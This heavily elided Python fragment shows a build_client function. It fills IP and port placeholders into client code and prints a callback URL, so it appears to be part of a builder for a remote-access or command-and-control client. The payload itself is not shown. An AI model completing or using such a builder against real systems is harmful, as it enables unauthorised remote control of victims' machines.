...
def build_client():
    ...
    client_code = client_code.replace('YOUR_SPECIALIZED_IP', specialized_ip)
    client_code = client_code.replace('YOUR_REAL_IP', real_ip)
    client_code = client_code.replace('YOUR_PORT', str(config['server_port']))
    ...
    try:
        ...
        if result.returncode == 0:
            ...
            print(f"[+] Callback URL: {specialized_ip}:{config['server_port']}")
            return True
        else:
